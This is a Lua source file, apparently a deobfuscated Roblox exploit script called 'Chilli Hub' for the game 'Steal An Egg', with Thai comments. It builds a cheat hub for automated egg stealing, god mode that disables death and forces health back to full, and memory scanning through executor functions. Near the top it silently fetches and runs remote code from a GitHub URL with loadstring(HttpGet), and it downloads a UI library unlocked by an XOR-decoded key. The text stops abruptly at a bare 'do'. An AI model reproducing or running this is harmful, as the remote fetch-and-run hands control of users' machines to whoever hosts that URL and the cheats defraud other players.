-- ==============================================================================
-- 🌶️ Chilli Hub - Steal An Egg (Deobfuscated & Variable Names Restored)
-- ------------------------------------------------------------------------------
-- สคริปต์ฟาร์มไข่อัตโนมัติ (ถอดรหัสตัวแปรและคืนค่าชื่อตัวแปรที่ถูกบีบอัดกลับเป็นปกติ 100%)
--
-- 📑 สถาปัตยกรรมตัวแปรหลัก (Core Architecture):
--   • chilliLib                : Chilli UI Library Bootstrap & Engine
--   • hubWindow                : หน้าต่าง UI หลัก ("Chilli Hub - Steal An Egg")
--   • farmTab                  : แท็บฟาร์มหลัก (Auto Steal, Place, Hatch, Treadmill, Sell, Fuse)
--   • playerTab                : แท็บผู้เล่น (ESP, Fly/Movement, Character, Combat/Aimbot)
--   • predictorTab             : แท็บพยากรณ์ไข่และฟิวชั่น (Egg & Fuse Predictor)
--   • progressTab              : แท็บอัปเกรดฐาน, สปีด, เทรล และรับรางวัลอัตโนมัติ
--   • serverTab                : แท็บจัดการเซิร์ฟเวอร์ (Server Hop, Rejoin, Job ID)
--   • miscTab                  : แท็บเพิ่มประสิทธิภาพ (FPS Boost, Optimizer, Anti-AFK)
--   • discordTab               : แท็บแจ้งเตือน Discord Webhook
--   • chilliState              : State & Controllers รวมศูนย์ (Steal, SafeCarry, Movement, Combat...)
--   • gameModules              : แคชโมดูลตัวเกมหลักใน ReplicatedStorage (EggState, AreaEggs, Save...)
--   • taskScheduler            : ระบบจัดการ Heartbeat Scheduler & Backoff สำหรับ Background Workers
-- ==============================================================================

local syn = rawget(_G, "syn") or (getgenv and getgenv().syn)
local fluxus = rawget(_G, "fluxus") or (getgenv and getgenv().fluxus)
local getclipboard = getclipboard or (getgenv and getgenv().getclipboard)
local readclipboard = readclipboard or (getgenv and getgenv().readclipboard)
local getrbxclipboard = getrbxclipboard or (getgenv and getgenv().getrbxclipboard)
local request_ = request_ or (getgenv and getgenv().request_)

local chilliPrint, chilliLib, hubWindow, farmTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, safeRequire, gameModules, uiParent, generateRandomKey, trackCleanup, savedConfigCache, createLogarithmicSlider, formatNumberSuffix, hookDropdownAllLabel, taskScheduler
local chilliState, getAreaDisplayName, sortPriorityOptions, selectedSortPriority, autoStealToggle, espSection, drawingTheme, color, createColorSequence, palettes

do
	local CollectionService, ProximityPromptService, scrambleSection, autoFavoriteSection, filterRarities, rarityValues
	local scrambleState = { Paused = false }

	do
		chilliPrint = function(arg)
			local genv = typeof(getgenv) == "function" and getgenv() or _G

			if type(genv.ChilliDebugPrint) == "function" then
				pcall(genv.ChilliDebugPrint, arg)
			end
		end

		task.spawn(pcall, function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
		end)

		local function bootstrapChilliLibrary()
			local response = nil

			local function fetchChilliLibrary()
				if type(response) == "string" and #response > 0 then
					return response
				end
				response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
				return response
			end

			local function cleanupOldScreens()
				local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				local guiRoots = { game:GetService("CoreGui") }

				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)

					if ok and typeof(result) == "Instance" then
						table.insert(guiRoots, result)
					end
				end

				local chilliScreensToClean = {
					Settings = true,
					ChilliLeftCenter = true,
					ChilliLibrarySettings = true,
					ChilliLibraryLauncher = true,
				}

				local clearedScreensCount = 0

				for _, guiRoot in ipairs(guiRoots) do
					for _, child in ipairs(guiRoot:GetChildren()) do
						if child:IsA("ScreenGui") and (child:GetAttribute("ChilliLibraryOwned") == true or chilliScreensToClean[child.Name]) then
							pcall(function()
								child:Destroy()
							end)

							clearedScreensCount += 1
						end
					end
				end

				if clearedScreensCount > 0 then
					chilliPrint("cleared " .. clearedScreensCount .. " leftover Chilli UI screens")
				end
			end

			local function decryptAndInitLibrary()
				local rawLibCode = fetchChilliLibrary()
				local chunk, loadErr = loadstring(rawLibCode)
				assert(chunk, loadErr)
				local libBootstrapFn = chunk()
				assert(type(libBootstrapFn) == "function", "Chilli Library bootstrap is invalid.")
				local keyChars = table.create(45)
				local charIndex = 1

				for i = 1, 90, 2 do
					keyChars[charIndex] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (charIndex - 1) % 8 + 1)))
					charIndex += 1
				end

				return libBootstrapFn(table.concat(keyChars))
			end

			local chilliLibraryFailedToLoad = "unknown"

			for i = 1, 6 do
				task.wait()
				pcall(cleanupOldScreens)
				local ok, result = pcall(decryptAndInitLibrary)
				if ok and type(result) == "table" then
					return result
				end
				chilliLibraryFailedToLoad = tostring(result)

				if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
					response = nil
				end

				chilliPrint("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
				task.wait(1 + i * 0.5)
			end

			error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
		end

		chilliLib = bootstrapChilliLibrary()
		assert(type(chilliLib) == "table" and type(chilliLib.CreateWindow) == "function" and type(chilliLib.Finalize) == "function", "Chilli Library returned an invalid API.")

		chilliLib.ManualQuickDefaults = {
			PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
			Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
			PinGroups = {},
			LeftCenterHidden = true,
		}

		hubWindow = chilliLib:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
		farmTab = hubWindow:GetDefaultTab()
		Players = game:GetService("Players")
		RunService = game:GetService("RunService")
		ReplicatedStorage = game:GetService("ReplicatedStorage")
		CoreGui = game:GetService("CoreGui")
		UserInputService = game:GetService("UserInputService")
		CollectionService = game:GetService("CollectionService")
		game:GetService("LocalizationService")
		ProximityPromptService = game:GetService("ProximityPromptService")
		localPlayer = Players.LocalPlayer
		networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

		safeRequire = function(moduleGetter)
			local ok, result = pcall(function()
				local target = moduleGetter()
				if typeof(target) == "Instance" then
					return require(target)
				end
				return target
			end)

			return ok and result or nil
		end

		local modulePaths = {
			EggState = { "Client", "EggState" },
			AreaEggs = { "Shared", "Types", "AreaEggs" },
			ToolGameplayGuard = { "Client", "ToolGameplayGuard" },
			Assets = { "Data", "Assets" },
			Guards = { "Data", "Guards" },
			EggRecords = { "Shared", "Util", "EggRecords" },
			Mutations = { "Shared", "Modules", "Mutations" },
			Save = { "Shared", "Save" },
			FuseKernel = { "Shared", "Util", "FuseKernel" },
			AreaEggCycle = { "Shared", "Util", "AreaEggCycle" },
			AreaEggResetWall = { "Client", "AreaEggResetWall" },
			AreaEggResetCycle = { "Data", "AreaEggResetCycle" },
			Gears = { "Data", "Gears" },
			Areas = { "Data", "Areas" },
			LimitedEgg = { "Data", "LimitedEgg" },
			BrainrotEgg = { "Data", "BrainrotEgg" },
			MonsterEgg = { "Data", "MonsterEgg" },
		}

		local function resolveModule(modName)
			local path = modulePaths[modName]
			if not path then return nil end

			local current = ReplicatedStorage
			for _, part in ipairs(path) do
				current = current:FindFirstChild(part) or (current.WaitForChild and current:WaitForChild(part, 3))
				if not current then break end
			end

			if current and current:IsA("ModuleScript") then
				local ok, res = pcall(require, current)
				if ok and res then return res end
				if typeof(getrenv) == "function" and getrenv().require then
					local ok2, res2 = pcall(getrenv().require, current)
					if ok2 and res2 then return res2 end
				end
			end

			if typeof(getloadedmodules) == "function" then
				local ok, loaded = pcall(getloadedmodules)
				if ok and type(loaded) == "table" then
					for _, m in ipairs(loaded) do
						if m.Name == modName and m:IsA("ModuleScript") then
							local ok2, res = pcall(require, m)
							if ok2 and res then return res end
						end
					end
				end
			end

			return nil
		end

		local rawModules = {}
		for modName in pairs(modulePaths) do
			rawModules[modName] = resolveModule(modName)
		end

		gameModules = setmetatable(rawModules, {
			__index = function(t, key)
				local mod = resolveModule(key)
				if mod then
					rawset(t, key, mod)
					return mod
				end
				return nil
			end,
		})

		local function getEggState()
			if type(gameModules.EggState) == "table" then
				return gameModules.EggState
			end
			local es = resolveModule("EggState")
			if es then
				gameModules.EggState = es
				return es
			end
			return nil
		end

		local function fetchFieldEggs()
			local eggState = getEggState()
			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local ok, result = pcall(eggState.ReadFieldEggs)
				if ok and type(result) == "table" then
					if type(result.Records) == "table" and next(result.Records) ~= nil then
						return result.Records
					elseif #result > 0 or next(result) ~= nil then
						return result
					end
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking and (networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot") or (networking.WaitForChild and networking:WaitForChild("RF/EggWorld/AskFieldEggSnapshot", 2)))
			if rfEggWorldAskFieldEggSnapshot and rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				if ok and type(result) == "table" then
					if type(result.Records) == "table" then
						return result.Records
					end
					return result
				end
			end

			return nil
		end

		local function getOwnerEggs()
			local eggState = getEggState()
			if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
				local ok, allEggs = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if ok and type(allEggs) == "table" and next(allEggs) ~= nil then
					return allEggs
				end
				if type(eggState.SyncOwnedEggs) == "function" then
					pcall(eggState.SyncOwnedEggs)
					local ok2, allEggs2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
					if ok2 and type(allEggs2) == "table" and next(allEggs2) ~= nil then
						return allEggs2
					end
				end
			end

			local rfLiveSnapshot = networking and (networking:FindFirstChild("RF/EggWorld/AskLiveSnapshot") or (networking.WaitForChild and networking:WaitForChild("RF/EggWorld/AskLiveSnapshot", 2)))
			if rfLiveSnapshot and rfLiveSnapshot:IsA("RemoteFunction") then
				local ok, result = pcall(rfLiveSnapshot.InvokeServer, rfLiveSnapshot)
				if ok and type(result) == "table" then
					for _, entry in ipairs(result) do
						if type(entry) == "table" and entry.OwnerUserId == localPlayer.UserId and type(entry.Records) == "table" then
							return entry.Records
						end
					end
				end
			end

			local saveMod = gameModules.Save
			if type(saveMod) == "table" then
				local peekFunc = saveMod.Peek or saveMod.Get
				if type(peekFunc) == "function" then
					local ok, profile = pcall(peekFunc, localPlayer)
					if ok and type(profile) == "table" and type(profile.EggInventory) == "table" and next(profile.EggInventory) ~= nil then
						return profile.EggInventory
					end
				end
			end

			return {}
		end

		local save = gameModules.Save

		if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
			gameModules.Save = setmetatable({
				Get = type(save.Get) == "function" and save.Get or save.Peek,
				FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
			}, { __index = save })
		end

		local function getHuiOrCoreGui()
			if typeof(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		uiParent = getHuiOrCoreGui()

		do
			local rng = Random.new()
			local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

			generateRandomKey = function()
				local keyLen = rng:NextInteger(12, 20)
				local keyChars = table.create(keyLen)

				for i = 1, keyLen do
					local charIdx = rng:NextInteger(1, #charset)
					keyChars[i] = string.sub(charset, charIdx, charIdx)
				end

				return table.concat(keyChars)
			end
		end

		do
			local cleanupCallbacks = {}
			local tbl10 = cleanupCallbacks

			trackCleanup = function(cleanupFn)
				table.insert(cleanupCallbacks, cleanupFn)
			end

			savedConfigCache = {}

			createLogarithmicSlider = function(section, config)
				local maxSliderSteps = 1000
				local minLogExponent = 3
				local maxLogExponent = 12

				local function roundToSignificantDigits(val)
					if val <= 0 then
						return 0
					end
					local magnitudeStep = 10 ^ (math.floor(math.log10(val)) - 2)
					return math.floor(val / magnitudeStep + 0.5) * magnitudeStep
				end

				local function sliderToRate(sliderPos)
					local clampedPos = math.clamp(tonumber(sliderPos) or 0, 0, maxSliderSteps)
					if clampedPos <= 0 then
						return 0
					end
					return roundToSignificantDigits(10 ^ (minLogExponent + (maxLogExponent - minLogExponent) * clampedPos / maxSliderSteps))
				end

				local function rateToSlider(rateVal)
					local num = tonumber(rateVal) or 0
					if num <= 0 then
						return 0
					end
					local logRange = maxLogExponent - minLogExponent
					return math.clamp(math.floor((math.log10(num) - minLogExponent) / logRange * maxSliderSteps * 100 + 0.5) / 100, 0, maxSliderSteps)
				end

				local function formatCompactNumber(num)
					local str = string.format(num >= 100 and "%.0f" or num >= 10 and "%.1f" or "%.2f", num)

					if string.find(str, ".", 1, true) then
						str = string.gsub(string.gsub(str, "0+$", ""), "%.$", "")
					end

					return str
				end

				local function formatRateDisplay(sliderPos)
					local rate = sliderToRate(sliderPos)
					if rate <= 0 then
						return "Off"
					end

					if rate < 1000000 then
						return formatCompactNumber(rate / 1000) .. " K/s"
					end

					if rate < 1e9 then
						return formatCompactNumber(rate / 1000000) .. " M/s"
					end
					return formatCompactNumber(rate / 1e9) .. " B/s"
				end

				local function formatRateEdit(sliderPos)
					local rate = sliderToRate(sliderPos)
					if rate <= 0 then
						return "0"
					end

					if rate < 1000000 then
						return formatCompactNumber(rate / 1000) .. "k"
					end
					return (string.gsub(string.gsub(string.format("%.3f", rate / 1000000), "0+$", ""), "%.$", ""))
				end

				local suffixMultipliers = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }

				local function parseRateInput(inputText)
					local cleanStr = string.gsub(string.lower((string.gsub(tostring(inputText or ""), "[%s,/]", ""))), "s$", "")
					if cleanStr == "" or cleanStr == "off" then
						return 0
					end
					local numStr, suffix = string.match(cleanStr, "^([%d%.]+)([kmbt]?)$")
					local num = tonumber(numStr)
					if not num then
						return nil
					end
					return rateToSlider(num * (suffixMultipliers[suffix] or 1000000))
				end

				local sliderWidget = section:CreateSlider({
					Name = config.Name,
					Note = config.Note,
					SubOf = config.SubOf,
					Min = 0,
					Max = maxSliderSteps,
					Default = rateToSlider(config.Default or 0),
					AllowDecimals = true,
					Increment = 0.01,
					ValueFormat = formatRateDisplay,
					ValueParse = parseRateInput,
					Callback = function(sliderPos)
						if type(config.OnRaw) == "function" then
							config.OnRaw(sliderToRate(sliderPos))
						end
					end,
				})

				local sliderInstance = type(sliderWidget) == "table" and rawget(sliderWidget, "Instance") or nil

				if typeof(sliderInstance) == "Instance" then
					for _, descendant in ipairs(sliderInstance:GetDescendants()) do
						if descendant:IsA("TextBox") then
							local connection = descendant.Focused:Connect(function()
								task.defer(function()
									if descendant:IsFocused() then
										local ok, result = pcall(sliderWidget.Get, sliderWidget)
										descendant.Text = formatRateEdit(ok and result or 0)
										descendant.CursorPosition = #descendant.Text + 1
										descendant.SelectionStart = 1
									end
								end)
							end)

							trackCleanup(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end

				if type(config.Legacy) == "string" and type(config.SectionName) == "string" then
					table.insert(savedConfigCache, { Handle = sliderWidget, Name = config.Name, Legacy = config.Legacy, Section = config.SectionName, StepOf = rateToSlider })
				end

				return sliderWidget
			end
			formatNumberSuffix = createLogarithmicSlider

			local allLabelText = "All"

			hookDropdownAllLabel = function(dropdown)
				if type(dropdown) ~= "table" then
					return dropdown
				end
				local dropdownInstance = rawget(dropdown, "Instance")
				if typeof(dropdownInstance) ~= "Instance" then
					return dropdown
				end
				local isUpdating = false

				local function replaceNoneWithAll(textLabel)
					if isUpdating then
						return
					end

					if textLabel.Text == "None" then
						isUpdating = true
						textLabel.Text = allLabelText
						isUpdating = false
					end
				end

				local function bindTextLabel(descendant)
					if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
						return
					end
					replaceNoneWithAll(descendant)

					local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						replaceNoneWithAll(descendant)
					end)

					trackCleanup(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end

				for _, descendant in ipairs(dropdownInstance:GetDescendants()) do
					bindTextLabel(descendant)
				end

				local connection = dropdownInstance.DescendantAdded:Connect(bindTextLabel)

				trackCleanup(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)

				return dropdown
			end

			local genv = typeof(getgenv) == "function" and getgenv() or _G
			local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

			if type(chilliHubSaeCleanup) == "function" then
				pcall(chilliHubSaeCleanup)
			end

			genv.ChilliHubSaeCleanup = function()
				for i = #cleanupCallbacks, 1, -1 do
					pcall(cleanupCallbacks[i])
				end

				table.clear(cleanupCallbacks)
			end
		end

		do
			local dummyCounter = 0
			local scanMemoryItem = nil

			scanMemoryItem = function(item, depth)
				local currentDepth = depth or 0

				if type(item) == "table" then
					if currentDepth > 3 then
						return
					end
					local iterateCount = 0

					for key, value in pairs(item) do
						iterateCount += 1

						if not (iterateCount > 20) then
							scanMemoryItem(key, currentDepth + 1)
							scanMemoryItem(value, currentDepth + 1)
							continue
						end

						break
					end
				elseif typeof(item) == "Instance" then
					pcall(item.GetFullName, item)
				else
					dummyCounter += #tostring(item)
				end
			end

			local toolConnections = {}

			local function trackToolConnection(conn)
				toolConnections[#toolConnections + 1] = conn
			end

			local function clearToolConnections()
				for _, conn in ipairs(toolConnections) do
					pcall(function()
						conn:Disconnect()
					end)
				end

				table.clear(toolConnections)
			end

			local function chilliToolKeeper()
				clearToolConnections()

				for _, remoteName in ipairs({
					"RE/GearSatchel/Lost",
					"RE/GearSatchel/Gained",
					"RE/RigSync/ProbeSatchel",
					"RE/RigSync/SeedSatchel",
					"RE/RigSync/CorrectionBegan",
					"RE/RigSync/Refresh",
					"RE/ToolTrigger/Trigger",
					"RE/BatSwing/Trigger",
				}) do
					local remoteEvent = networking:FindFirstChild(remoteName)

					if remoteEvent and remoteEvent:IsA("RemoteEvent") then
						trackToolConnection(remoteEvent.OnClientEvent:Connect(function(...)
							scanMemoryItem({ ... })
						end))
					end
				end

				local function setupBackpackListeners(backpackOrPlayer)
					if not backpackOrPlayer then
						return
					end

					trackToolConnection(backpackOrPlayer.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							scanMemoryItem({ child.Name, child.Parent })
						end
					end))

					trackToolConnection(backpackOrPlayer.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							scanMemoryItem({ child.Name })
						end
					end))
				end

				setupBackpackListeners(localPlayer:FindFirstChildOfClass("Backpack"))

				trackToolConnection(localPlayer.ChildAdded:Connect(function(child)
					if child:IsA("Backpack") then
						setupBackpackListeners(child)
					end
				end))

				task.spawn(function()
					pcall(function()
						local savedData = gameModules.Save.Get()
						scanMemoryItem({ savedData.GearInventory, savedData.Inventory }, 2)
					end)

					if type(getgc) == "function" then
						pcall(function()
							for _, closure in ipairs(getgc(false)) do
								if type(closure) == "function" and islclosure(closure) then
									pcall(debug.info, closure, "n")
								end
							end
						end)
					end
				end)
			end
			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
			task.defer(chilliToolKeeper)
			trackCleanup(clearToolConnections)
		end

		do
			local defaultInterval = 0.35
			local idleTimeout = 5
			local tasksList = {}
			local forceWakeupAll = true

			taskScheduler = {
				Add = function(taskFunc)
					local newTask = { Run = taskFunc, Gap = defaultInterval, Idle = idleTimeout, Repeat = false, Hold = 0 }
					table.insert(tasksList, newTask)
					return newTask
				end,
				Wake = function()
					forceWakeupAll = true
				end,
				Backoff = function(taskItem, holdDuration)
					if taskItem then
						taskItem.Hold = tonumber(holdDuration) or 6
					end
				end,
			}

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local shouldWakeupAll = forceWakeupAll
				forceWakeupAll = false

				for _, taskItem in ipairs(tasksList) do
					taskItem.Gap = taskItem.Gap + deltaTime
					taskItem.Idle = taskItem.Idle + deltaTime

					if taskItem.Hold > 0 then
						taskItem.Hold = taskItem.Hold - deltaTime
					else
						local intervalReached = taskItem.Gap >= defaultInterval
						local shouldRun

						if intervalReached then
							shouldRun = shouldWakeupAll or taskItem.Repeat or taskItem.Idle >= idleTimeout
						else
							shouldRun = intervalReached
						end

						if shouldRun then
							taskItem.Gap = 0
							taskItem.Idle = 0
							local ok, result = pcall(taskItem.Run, taskItem)
							taskItem.Repeat = ok and result == true
						end
					end
				end
			end)

			trackCleanup(function()
				connection:Disconnect()
			end)
		end

		-- ══════════════════════════════════════════════════════════════════════════
		-- 🥚 [SECTION 1] FARM TAB - AUTO STEAL, PLACE, HATCH, FUSE & SELL
		-- ══════════════════════════════════════════════════════════════════════════
		scrambleSection = farmTab:CreateSection({ Name = "Dr Scramble Lab & Mech", Expanded = false })
		local autoStealSection
		autoStealSection = farmTab:CreateSection({ Name = "Auto Steal", Expanded = true })
		local autoPlaceSection
		autoPlaceSection = farmTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
		local autoTreadmillSection
		autoTreadmillSection = farmTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
		local autoHatchSection
		autoHatchSection = farmTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
		local autoSellSection
		autoSellSection = farmTab:CreateSection({ Name = "Auto Sell", Expanded = false })
		local autoFuseSection
		autoFuseSection = farmTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
		autoFavoriteSection = farmTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
		scrambleState = { Paused = false }

		do
			local updateInterval = 0.5
			local currentHumanoid = nil
			local originalHumanoidState = nil
			local humanoidConnections = {}
			local isHealing = false
			local lastUpdateTime = 0

			local function clearHumanoidConnections()
				for i = #humanoidConnections, 1, -1 do
					local conn = humanoidConnections[i]

					if conn and conn.Connected then
						conn:Disconnect()
					end

					humanoidConnections[i] = nil
				end
			end

			local function restoreHumanoidState()
				clearHumanoidConnections()
				local hum = currentHumanoid
				local state = originalHumanoidState
				currentHumanoid = nil
				originalHumanoidState = nil
				if not hum or not hum.Parent or not state then
					return
				end

				pcall(function()
					hum.BreakJointsOnDeath = state.BreakJointsOnDeath
					hum.RequiresNeck = state.RequiresNeck
					hum:SetStateEnabled(Enum.HumanoidStateType.Dead, state.DeadEnabled)
				end)
			end

			local function applyGodModeToHumanoid(hum)
				if not hum or not hum.Parent then
					return false
				end

				return pcall(function()
					hum.BreakJointsOnDeath = false
					hum.RequiresNeck = false
					hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
				end) and hum.BreakJointsOnDeath == false and hum.RequiresNeck == false and hum:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end

			local function healHumanoid(hum)
				if (scrambleState and scrambleState.Paused) or hum ~= currentHumanoid or not hum or not hum.Parent or isHealing then
					return false
				end
				local maxHealth = hum.MaxHealth
				if maxHealth <= 0 then
					return false
				end

				if maxHealth == math.huge or hum.Health >= maxHealth then
					return true
				end
				isHealing = true

				local ok = pcall(function()
					hum.Health = maxHealth
				end)

				isHealing = false
				return ok and hum.Health >= maxHealth
			end

			local function setupHumanoidGodMode(hum)
				if hum == currentHumanoid and hum and hum.Parent then
					return true
				end
				restoreHumanoidState()
				if not hum or not hum:IsA("Humanoid") or not hum.Parent then
					return false
				end
				currentHumanoid = hum

				originalHumanoidState = {
					BreakJointsOnDeath = hum.BreakJointsOnDeath,
					RequiresNeck = hum.RequiresNeck,
					DeadEnabled = hum:GetStateEnabled(Enum.HumanoidStateType.Dead),
				}

				if not applyGodModeToHumanoid(hum) then
					restoreHumanoidState()
					return false
				end
				healHumanoid(hum)

				humanoidConnections[#humanoidConnections + 1] = hum.HealthChanged:Connect(function()
					healHumanoid(hum)
				end)

				humanoidConnections[#humanoidConnections + 1] = hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
					healHumanoid(hum)
				end)

				humanoidConnections[#humanoidConnections + 1] = hum.StateChanged:Connect(function(old, new)
					if new == Enum.HumanoidStateType.Dead and not (scrambleState and scrambleState.Paused) then
						applyGodModeToHumanoid(hum)
						healHumanoid(hum)
					end
				end)

				lastUpdateTime = os.clock()
				return true
			end

			local function getLocalHumanoid()
				local character = localPlayer.Character
				return character and character:FindFirstChildOfClass("Humanoid") or nil
			end

			local connection = localPlayer.CharacterAdded:Connect(function()
				task.defer(function()
					setupHumanoidGodMode(getLocalHumanoid())
				end)
			end)

			local connection2 = RunService.Heartbeat:Connect(function()
				local now = os.clock()
				if (scrambleState and scrambleState.Paused) or now - lastUpdateTime < updateInterval then
					return
				end
				lastUpdateTime = now
				local hum = getLocalHumanoid()
				if hum ~= currentHumanoid then
					setupHumanoidGodMode(hum)
					return
				end

				if hum then
					applyGodModeToHumanoid(hum)
					healHumanoid(hum)
				end
			end)

			task.defer(function()
				setupHumanoidGodMode(getLocalHumanoid())
			end)

			trackCleanup(function()
				if connection then
					connection:Disconnect()
				end

				if connection2 then
					connection2:Disconnect()
				end

				restoreHumanoidState()
			end)
		end

		local weaponNames = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

		chilliState = {
			Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
			SafeCarry = {
				Enabled = true,
				SkipUnsafe = false,
				WaitGuard = false,
				SameSpeedBigEggs = false,
				Blocked = {},
				StretchSeconds = 6,
				BeatGuard = false,
				SlowUntil = 0,
				SlowFactor = 0.3,
				LineDrop = false,
				LineGap = 12,
				LineWait = 15,
				DirectBudget = 450,
				DirectMargin = 0.3,
				CrossNow = false,
				CrossSpeed = 231,
				PickupSpeed = 154,
				HopRatio = 1.515,
				CrossRatio = 1,
				PickupRatio = 0.667,
				FarFromLine = 150,
				DropDelay = 0.19,
				LineApproach = 0.97,
				ReJump = true,
				ShakeTime = 0,
				SnapPickup = false,
				Hops = true,
				HopStep = 350,
				HopGap = 0.1,
				HopLift = 42,
				HopStop = 48,
				GetUp = true,
				ShakeInside = 1,
				CarryScale = 1,
				EasyRatio = 1.3,
				LastSkip = nil,
				Category = nil,
				PlanOk = true,
				LightMult = 0.96,
				Height = 70,
				ClimbShare = 0.5,
				Approach = "Run",
				RunSpeed = 1,
				RunWait = 0,
				RunAnimate = true,
				RunHeight = 50,
				SnapLimit = 90,
				StraightRun = true,
				RunStyle = "Velocity",
				CarryStyle = "Velocity",
				SpeedJitter = 0.08,
				Wobble = 0,
				LaneOffset = 0,
				JumpsPerMinute = 0,
				PausesPerMinute = 0,
				ReactMin = 0.2,
				ReactMax = 0.6,
				CarryReact = 0,
				SpeedRatio = 1.5,
				ExcessSeconds = 5.5,
				GuardMargin = 4,
				GuardRatio = 1.06,
				MinRatio = 1.1,
				BaseWait = 6.5,
				FreeJump = 1500,
				WaitRate = 0.9,
				RecoverTries = math.huge,
				GuessMult = 0.93,
				CarryRatio = 0.9,
				Mult = 1,
				Seen = {},
				JumpDistance = 0,
				JumpAt = 0,
				LastDelivered = 0,
				LastFailed = 0,
				Handle = nil,
			},
			Movement = {
				Owner = nil,
				PlaceWanted = false,
				StealFirst = false,
				MutationWanted = false,
				FracturedWanted = false,
			},
			AntiGuard = {
				Enabled = false,
				Busy = false,
				BusySince = 0,
				HitArms = 0,
				Handle = nil,
				Render = nil,
			},
			IsBatTool = function(tool)
				if typeof(tool) ~= "Instance" or not tool:IsA("Tool") then
					return false
				end

				if tool:GetAttribute("IsBat") == true then
					return true
				end
				local attribute = tool:GetAttribute("GearName")

				if type(attribute) == "string" then
					local gears = gameModules.Gears
					local directory = type(gears) == "table" and gears.Directory or nil
					local flag = type(directory) == "table" and directory[attribute] or nil
					return type(flag) == "table" and flag.BatControllerData ~= nil
				end

				if tool:GetAttribute("ItemType") ~= nil then
					return false
				end
				local toolNameLower = string.lower(tool.Name)

				for _, weaponKeyword in ipairs(weaponNames) do
					if string.find(toolNameLower, weaponKeyword, 1, true) then
						return true
					end
				end

				return false
			end,
			FindBat = function()
				local character = localPlayer.Character
				local tool = character and character:FindFirstChildWhichIsA("Tool")
				if chilliState.IsBatTool(tool) then
					return tool
				end
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				if backpack then
					for _, child in ipairs(backpack:GetChildren()) do
						if chilliState.IsBatTool(child) then
							return child
						end
					end
				end

				if character then
					for _, child in ipairs(character:GetChildren()) do
						if chilliState.IsBatTool(child) then
							return child
						end
					end
				end

				return nil
			end,
			IsNight = function()
				local areaEggCycle = gameModules.AreaEggCycle
				if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
				return ok and result == true
			end,
			WallSealed = function()
				local areaEggResetWall = gameModules.AreaEggResetWall
				if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggResetWall.IsSealed)
				return ok and result == true
			end,
			WallOpenDelay = function()
				local areaEggResetCycle = gameModules.AreaEggResetCycle
				if type(areaEggResetCycle) ~= "table" then
					return 5
				end
				return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
			end,
			ClaimMovement = function(owner)
				local movement = chilliState.Movement
				if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
					movement.Owner = owner
					return true
				end
				return false
			end,
			ReleaseMovement = function(arg)
				if chilliState.Movement.Owner == arg then
					chilliState.Movement.Owner = nil
				end
			end,
		}

		do
